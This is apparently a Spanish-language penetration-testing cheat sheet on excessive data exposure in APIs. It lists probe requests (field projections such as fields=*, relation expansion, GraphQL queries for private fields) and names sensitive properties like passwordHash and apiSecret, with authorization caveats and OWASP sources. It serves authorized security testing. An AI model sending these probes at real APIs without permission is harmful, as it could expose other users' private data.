# 🗡️ Exposición excesiva de datos en API: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Vistas de un mismo objeto

```text
GET /api/v1/profile/{ID_PROPIO}
GET /api/v1/users?limit=2
GET /api/v1/profile/{ID_PROPIO}/export
```

**Cuándo usarlo:** Comparar campos necesarios en UI con cuerpo crudo, lista y export de la propia cuenta.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).


### Propiedades sensibles a clasificar

```text
privateEmail
recoveryHint
internalNotes
passwordHash
apiSecret
tenantInternalId
```

**Cuándo usarlo:** Una propiedad solo es hallazgo si el actor no debería conocerla y se confirma dato real de prueba.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/12-API_Testing/03-Excessive_Data_Exposure/).


## 🧭 Payloads por contexto

### Proyecciones y expansión

```text
?fields=id,name,privateEmail
?fields=*
?expand=members
?expand=members.profile
```

**Cuándo usarlo:** Solo si la API soporta esos parámetros; el backend debe autorizar cada propiedad expandida.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).


## 🔥 Payloads avanzados

### Campo GraphQL protegido

```graphql
query { viewer { id privateEmail recoveryHint } }
query { project(id:"{ID_PROPIO}") { id members { id privateEmail } } }
```

**Cuándo usarlo:** Adaptar al esquema y usar miembros de prueba; campos resolubles no equivalen automáticamente a fuga.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/graphql).


## 🔬 Pruebas guiadas por escenario

### 1. Respuesta completa frente a interfaz

**Objetivo:** Comparar campos de la API con los que necesita la vista.

```http
GET /api/v1/profile/{ID_PROPIO} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** No basta que el campo no aparezca en UI: demostrar propiedad sensible que A no debería recibir.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 2. Lista resumida frente a detalle

**Objetivo:** Detectar serialización excesiva en un listado de objetos propios.

```http
GET /api/v1/users?limit=2 HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Comprobar si cada elemento entrega propiedades privadas de otros usuarios, aun si el detalle está protegido.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/12-API_Testing/03-Excessive_Data_Exposure/).

### 3. Proyección de campos

**Objetivo:** Verificar si fields permite pedir propiedades fuera del rol.

```http
GET /api/v1/users/{ID_CONTROLADO_B}?fields=id,name,privateEmail HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Requiere que la API soporte selección de campos; el valor privado debe proceder de B de prueba.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 4. Expandir relación

**Objetivo:** Buscar propiedades protegidas al expandir una relación legítima.

```http
GET /api/v1/projects/{ID_PROPIO}?expand=members HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Comparar respuesta normal y expandida; exponer identificadores públicos de miembros puede ser esperado.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 5. GraphQL: campo de propiedad

**Objetivo:** Comprobar autorización de campo en un objeto al que sí se tiene acceso.

```graphql
query { viewer { id privateEmail recoveryHint } }
```

**Interpretación:** Adaptar nombres al esquema real. Un campo resoluble no es fallo si la política permite verlo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 6. Exportación acotada

**Objetivo:** Contrastar un export de un único objeto propio con la respuesta ordinaria.

```http
GET /api/v1/profile/{ID_PROPIO}/export HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Evaluar si incluye propiedades ocultas o de terceros; evitar exportaciones masivas.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 7. Respuesta según rol

**Objetivo:** Comparar el mismo objeto permitido para dos roles de prueba.

```text
GET /api/v1/projects/{ID_COMPARTIDO}  Authorization: Bearer {TOKEN_ROL_BAJO}
GET /api/v1/projects/{ID_COMPARTIDO}  Authorization: Bearer {TOKEN_ROL_ALTO}
```

**Interpretación:** Identificar diferencias justificadas por la política y datos privados recibidos por rol bajo.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 8. Búsqueda con campos internos

**Objetivo:** Revisar si un resultado de búsqueda devuelve más campos que la ficha.

```http
GET /api/v1/search?q=canary-{NONCE}&limit=2 HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Usar registros propios; comparar propiedades de cada resultado con permisos del rol.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/12-API_Testing/03-Excessive_Data_Exposure/).

### 9. Wildcard de proyección

**Objetivo:** Comprobar si la API permite pedir todas las propiedades con fields=*.

```http
GET /api/v1/users/{ID_CONTROLADO_B}?fields=* HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Solo si la API documenta fields. Evaluar propiedades privadas realmente recibidas desde B de prueba.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 10. Relación de segundo nivel

**Objetivo:** Verificar política de propiedades al expandir una relación anidada.

```http
GET /api/v1/projects/{ID_PROPIO}?expand=members.profile HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Comparar con expand=members. Mostrar identificadores públicos puede ser normal; foco en campos privados.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
